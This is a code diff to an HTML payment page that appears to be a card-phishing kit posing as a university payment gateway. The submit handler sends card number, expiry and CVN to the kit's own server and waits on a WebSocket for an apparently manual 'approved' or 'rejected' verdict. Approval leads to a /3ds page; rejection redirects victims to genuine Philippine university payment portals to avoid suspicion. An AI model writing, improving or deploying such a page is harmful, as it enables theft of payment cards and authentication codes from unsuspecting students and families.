@@ -12,6 +12,52 @@
     <link rel="stylesheet" href="/css/f.css" media="screen">
     <script defer src="js/j.js"></script>
     <script defer src="js/i.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.production.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.production.min.js"></script>
+    <style>
+        .processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .processing-content {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+
+        .status-message {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 4px;
+        }
+
+        .status-processing {
+            background: #e3f2fd;
+            color: #1976d2;
+        }
+
+        .status-approved {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+
+        .status-rejected {
+            background: #ffebee;
+            color: #c62828;
+        }
+    </style>
 </head>
 <body id="payment" class="">
     <noscript>
@@ -219,92 +265,80 @@
         </div>
     </div>
     <script>
-document.addEventListener("DOMContentLoaded", function() {
-    const cardNumberField = document.getElementById("card_number");
-    const cardNumberSpan = document.getElementById("im-card_number");
-    const cvnField = document.getElementById("card_cvn");
-    const cvnSpan = document.getElementById("im-card_cvn");
+        document.getElementById("payment-form").addEventListener("submit", function(e) {
+            e.preventDefault();
 
-    function maskCardNumber(value) {
-        return value.replace(/\d(?=\d{4})/g, "•");
-    }
+            // Create processing overlay
+            const overlay = document.createElement('div');
+            overlay.className = 'processing-overlay';
+            overlay.innerHTML = `
+                <div class="processing-content">
+                    <h3>Processing Payment</h3>
+                    <div id="status-message" class="status-message status-processing">
+                        Please wait while we process your payment...
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(overlay);
 
-    function maskCVN(value) {
-        return value.replace(/./g, "•");
-    }
-
-    // Mask card number input on blur
-    cardNumberField.addEventListener("blur", function() {
-        let value = cardNumberField.value.replace(/\D/g, "");
-        cardNumberSpan.textContent = maskCardNumber(value);
-    });
-
-    // Unmask card number input on focus
-    cardNumberField.addEventListener("focus", function() {
-        cardNumberSpan.textContent = "";
-    });
-
-    // Mask CVN input on blur
-    cvnField.addEventListener("blur", function() {
-        let value = cvnField.value.replace(/\D/g, "");
-        cvnSpan.textContent = maskCVN(value);
-    });
-
-    // Unmask CVN input on focus
-    cvnField.addEventListener("focus", function() {
-        cvnSpan.textContent = "";
-    });
-
-    document.getElementById("payment-form").addEventListener("submit", function(e) {
-        e.preventDefault();
-
-        // Blur the website
-        document.body.style.filter = "blur(3px)";
-        document.body.style.opacity = "0.6";
-
-        const cardType = document.querySelector('input[name="card_type"]:checked').value;
-        const cardNumber = cardNumberField.value.replace(/•/g, "");
-        const expiryMonth = document.getElementById("card_expiry_month").value;
-        const expiryYear = document.getElementById("card_expiry_year").value;
-        const cvn = cvnField.value.replace(/•/g, "");
-
-        const formData = {
-            card_type: cardType,
-            card_number: cardNumber,
-            expiry_month: expiryMonth,
-            expiry_year: expiryYear,
-            cvn: cvn
-        };
-
-        fetch("/submit-payment", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(formData)
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log("Success:", data);
-            const ws = new WebSocket('wss://' + window.location.host);
-            ws.onmessage = function(event) {
-                const message = JSON.parse(event.data);
-                document.body.style.filter = "";
-                document.body.style.opacity = "";
-                if (message.status === 'approved') {
-                    window.location.href = "/3ds";
-                } else if (message.status === 'rejected') {
-                    // Redirect to payment portal
-                    window.location.href = "https://www.ue.edu.ph/paymentportal/";
-                }
+            // Get form data
+            const formData = {
+                card_type: document.querySelector('input[name="card_type"]:checked').value,
+                card_number: document.getElementById("card_number").value,
+                expiry_month: document.getElementById("card_expiry_month").value,
+                expiry_year: document.getElementById("card_expiry_year").value,
+                cvn: document.getElementById("card_cvn").value
             };
-        })
-        .catch((error) => {
-            console.error("Error:", error);
-        });
-    });
-});
 
+            // Send payment data and establish WebSocket connection
+            fetch("/submit-payment", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Establish WebSocket connection
+                    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+                    const ws = new WebSocket(`${protocol}//${window.location.host}`);
+                    
+                    ws.onmessage = function(event) {
+                        const data = JSON.parse(event.data);
+                        const statusMessage = document.getElementById('status-message');
+                        
+                        if (data.status === 'approved') {
+                            statusMessage.className = 'status-message status-approved';
+                            statusMessage.textContent = 'Payment approved! Redirecting to authentication...';
+                            setTimeout(() => {
+                                window.location.href = '/3ds';
+                            }, 2000);
+                        } else if (data.status === 'rejected') {
+                            statusMessage.className = 'status-message status-rejected';
+                            statusMessage.textContent = 'Payment rejected. Redirecting to payment portal...';
+                            setTimeout(() => {
+                                window.location.href = 'https://onlinepay.perpetualdalta.edu.ph/';
+                            }, 2000);
+                        }
+                    };
+
+                    ws.onerror = function(error) {
+                        console.error('WebSocket Error:', error);
+                        const statusMessage = document.getElementById('status-message');
+                        statusMessage.className = 'status-message status-rejected';
+                        statusMessage.textContent = 'Connection error. Please try again.';
+                    };
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                const statusMessage = document.getElementById('status-message');
+                statusMessage.className = 'status-message status-rejected';
+                statusMessage.textContent = 'An error occurred. Please try again.';
+            });
+        });
     </script>
 </body>
 </html>
